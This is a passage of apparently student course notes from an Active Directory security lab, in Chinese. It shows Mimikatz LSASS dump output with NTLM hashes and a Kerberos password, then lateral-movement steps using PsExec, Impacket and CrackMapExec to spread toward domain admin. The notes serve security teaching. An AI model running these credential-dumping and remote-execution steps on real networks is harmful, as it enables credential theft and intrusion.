</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>996</span> <span style=color:#f92672>(</span>00000000:000003e4<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:38
</span></span><span style=display:flex><span>SID               : S-1-5-20
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : desktop-g95u93t$
</span></span><span style=display:flex><span>     * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>47346</span> <span style=color:#f92672>(</span>00000000:0000b8f2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : UMFD-1
</span></span><span style=display:flex><span>Domain            : Font Driver Host
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:38
</span></span><span style=display:flex><span>SID               : S-1-5-96-0-1
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma.org
</span></span><span style=display:flex><span>     * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>46297</span> <span style=color:#f92672>(</span>00000000:0000b4d9<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : UMFD-0
</span></span><span style=display:flex><span>Domain            : Font Driver Host
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:38
</span></span><span style=display:flex><span>SID               : S-1-5-96-0-0
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma.org
</span></span><span style=display:flex><span>     * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>44132</span> <span style=color:#f92672>(</span>00000000:0000ac64<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : UndefinedLogonType from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Domain            : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:37
</span></span><span style=display:flex><span>SID               : 
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>999</span> <span style=color:#f92672>(</span>00000000:000003e7<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : UndefinedLogonType from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:37
</span></span><span style=display:flex><span>SID               : S-1-5-18
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : desktop-g95u93t$
</span></span><span style=display:flex><span>     * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span></code></pre></div>:::
可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限</li></ol></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/>NTUSTISC - AD Note - Lab(遠端執行(RDP))</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab遠端執行rdp>NTUSTISC - AD Note - Lab(遠端執行(RDP))
<a class=anchor href=#ntustisc---ad-note---lab%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d">2022/05/11 AD 安全 2</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://zh.wikipedia.org/wiki/%E6%9C%80%E7%BB%88%E7%94%A8%E6%88%B7%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE>What is EULA?</a></p><blockquote><p>終端使用者授權合約（英語：end-user license agreements，英文縮寫：EULA）是指軟體的開發者或發行者授權使用者使用特定軟體產品時的規定，大多私有軟體附帶此合約，如不接受則無法安裝。不過自由軟體則較少使用這個合約</p></blockquote><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><p>此Lab主要是要讓我們可以遠端執行其他人的電腦，當我們已經取得local admin時，但domain admin遲遲沒有出現，我們就需要多找幾台主機試看看，可不可以登入或是遠端連線，這樣從一台主機出發，多幾台主機一起蹲domain admin的機會就會變大，可能會有疑問，要怎麼知道其他電腦的密碼呢?如果這一間公司它沒有使用之前介紹過的<a href=https://learn.microsoft.com/zh-tw/windows-server/identity/laps/laps-overview>LAPS密碼管理工具</a>，而且又是委外管理，則很有可能會有多台主機的密碼都一樣，然後再用前面提到的多種密碼提取方法(Brute Force SAM/Password Spraying etc)，得到更多台主機的密碼，然後再利用Mimikatz之類的工具把lsass的info leak出來，就有可能得到domain admin的密碼</p><h3 id=遠端執行rdp>==遠端執行(RDP)==
<a class=anchor href=#%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp>#</a></h3><h4 id=linux--kali>Linux / Kali
<a class=anchor href=#linux--kali>#</a></h4><ul><li>Tools<ul><li>xfreerdp<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo apt install freerdp2-x11 -y
</span></span></code></pre></div></li><li>Libfreerdp
先到<a href=https://packages.debian.org/sid/libfreerdp-client2-2>https://packages.debian.org/sid/libfreerdp-client2-2</a>這個頁面看一下要下載哪一個版本，Kali是amd64<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cd ~/Downloads
</span></span><span style=display:flex><span>$ wget http://ftp.tw.debian.org/debian/pool/main/f/freerdp2/libfreerdp-client2-2_2.10.0+dfsg1-1.1_amd64.deb
</span></span></code></pre></div></li></ul></li></ul><h4 id=windows>Windows
<a class=anchor href=#windows>#</a></h4><ul><li>Tools: <a href=https://learn.microsoft.com/zh-tw/sysinternals/downloads/psexec>Psexec.exe</a>
微軟的遠端執行工具，具有微軟的簽章，第一次使用需要接受EULA<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ PsExec.exe -i <span style=color:#ae81ff>\\</span>&lt;Remote IP&gt; -accepteula -u <span style=color:#f92672>[</span>&lt;domain&gt;<span style=color:#f92672>]</span><span style=color:#ae81ff>\&lt;</span>Remote Username&gt; -p &lt;Remote Password&gt; cmd
</span></span></code></pre></div></li></ul><h5 id=how-to-use-xfreerdp>==How to use xfreerdp==
<a class=anchor href=#how-to-use-xfreerdp>#</a></h5><p>網路上有很多文章和教學<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>，不過他們的情況和我們的狀況有點不一樣
:::success
使用條件：Win2016一定要打開，事先取得帳號的密碼
:::</p><a href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/>NTUSTISC - AD Note - Lab(遠端執行(RDP)2)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab遠端執行rdp2>NTUSTISC - AD Note - Lab(遠端執行(RDP)2)
<a class=anchor href=#ntustisc---ad-note---lab%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp2>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d">2022/05/11 AD 安全 2</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/Byk16MV0n>NTUSTISC - AD Note - Lab(Password Spraying)</a>
<a href=https://sectools.tw/impacket/>滲透測試的利器 - Impacket</a>:</p><blockquote><p>python撰寫的內網滲透工具</p></blockquote><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=遠端執行rdp2>==遠端執行(RDP)2==
<a class=anchor href=#%e9%81%a0%e7%ab%af%e5%9f%b7%e8%a1%8crdp2>#</a></h3><ul><li>Kali-Linux Tools<ul><li>Impacket(Kali-Linux愛好者可使用的PsExec)<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Set up &amp; Install</span>
</span></span><span style=display:flex><span>$ git clone https://github.com/fortra/impacket.git
</span></span><span style=display:flex><span>$ cd impacket
</span></span><span style=display:flex><span>$ conda activate py3.7 <span style=color:#75715e># Recommended to install it in conda</span>
</span></span><span style=display:flex><span>$ pip3 install -r requirements.txt
</span></span><span style=display:flex><span>$ python3 setup.py install
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Cheat-Sheet</span>
</span></span><span style=display:flex><span>$ conda activate py3.7
</span></span><span style=display:flex><span>$ proxychains psexec.py &lt;username&gt;:&lt;password&gt;@&lt;ip&gt; whoami
</span></span></code></pre></div></li><li>CrackMapExec<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ crackmapexec smb <span style=color:#f92672>[</span>IP<span style=color:#f92672>]</span> -u &lt;username&gt; -p &lt;password --exec-method smbexec -x <span style=color:#e6db74>&#39;&lt;command&gt;&#39;</span>
</span></span></code></pre></div>exec-method支援以下方法:
* mmcexec
* smbexec
* wmiexec
* atexec</li></ul></li></ul><h4 id=how-to-use-impacket>==How to use Impacket==
<a class=anchor href=#how-to-use-impacket>#</a></h4><p>感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具</p><a href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/information-security/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/information-security/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/information-security/ aria-label="Page 1" class=page-link role=button>1</a></li><li class="page-item active"><a aria-current=page aria-label="Page 2" class=page-link role=button>2</a></li><li class=page-item><a href=/tags/information-security/page/3/ aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=/tags/information-security/page/3/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/information-security/page/3/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>